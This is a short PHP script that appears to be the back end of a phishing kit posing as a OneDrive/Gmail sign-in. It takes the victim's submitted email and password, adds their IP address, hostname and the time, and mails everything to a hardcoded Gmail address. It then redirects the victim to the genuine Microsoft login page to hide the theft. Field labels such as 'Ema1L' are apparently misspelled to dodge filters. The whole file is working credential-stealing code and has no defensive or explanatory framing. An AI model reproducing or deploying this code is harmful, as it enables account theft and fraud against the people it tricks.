<?php

$ip = getenv("REMOTE_ADDR");
$time = date("m-d-Y g:i:a");
$hostname = gethostbyaddr($ip);

$msg .= "OneDrive - GMail\n";
$msg .= "******************************\n";
$msg .= "Ema1L: ".$_POST['email']."\n";
$msg .= "Pasw: ".$_POST['password']."\n";

$msg .= "\n";
$msg .= "========== IP Adress & Date ==========\n";
$msg .= "http://www.ip2location.com/$ip\n";
$msg .= "HostNam3 : ".$hostname."\n";

$msg .= "---------= Additional Details =---------\n";
$msg .= "Us3r-Ag3nt : ".$useragent."\n";
$msg .= "Date: $time\n";

$to ="williamrichard787@gmail.com";
$subject = "$ip";
$from = "From: VXN@$hostname";

mail($to,$subject,$msg,$from);

header("Location: https://login.microsoftonline.com/common/oauth2");

?>